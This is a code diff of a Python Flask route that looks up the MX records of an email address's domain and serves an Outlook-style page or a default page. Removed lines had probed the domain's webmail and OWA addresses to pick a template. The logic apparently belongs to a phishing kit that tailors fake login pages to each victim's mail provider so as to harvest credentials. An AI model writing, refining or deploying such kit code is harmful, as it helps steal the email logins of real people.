@@ -196,40 +196,24 @@ def route2():
     
     # Check MX records for mail.protection.outlook.com
     try:
-        mx_records = dns.resolver.resolve(domain, 'MX')
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = ["8.8.8.8"]  # Use Google's public DNS for better reliability
+        mx_records = resolver.resolve(domain, 'MX')
+
         for record in mx_records:
             if "mail.protection.outlook.com" in str(record.exchange):
+                print(f"Found Outlook MX record for {domain}")  # Debugging
                 return render_template('owa.html', eman=session['eman'], ins=session['ins'])
+    except dns.resolver.NoAnswer:
+        print(f"No MX records found for {domain}")
+    except dns.resolver.NXDOMAIN:
+        print(f"Domain {domain} does not exist")
+    except dns.exception.Timeout:
+        print(f"DNS request timed out for {domain}")
     except Exception as e:
-        pass  # Fail silently if DNS resolution fails
-    
-    # Define Webmail & OWA URLs (Skipping check for Gmail and Yahoo)
-    webmail_url = f"https://{domain}/webmail"
-    owa_urls = [
-        urljoin(f"https://owa.{domain}", "/owa/#path=/mail"),
-        urljoin(f"https://autodiscover.{domain}", "/owa/#path=/mail/search"),
-    ]
-    
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
-    
-    # Function to check if a URL returns status code 200
-    def is_accessible(url):
-        try:
-            response = requests.get(url, headers=headers, timeout=10)
-            return response.status_code == 200
-        except requests.RequestException:
-            return False
-    
-    # Check Webmail
-    if is_accessible(webmail_url):
-        return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
-    
-    # Check OWA
-    for owa_url in owa_urls:
-        if is_accessible(owa_url):
-            return render_template('owa.html', eman=session['eman'], ins=session['ins'])
-    
-    # Default if no match, passing variables to index.html
+        print(f"Error checking MX records for {domain}: {e}")
+
+    # Default to index.html if no match
     return render_template('index.html', eman=session.get('eman', ''), ins=session.get('ins', ''))
 
 
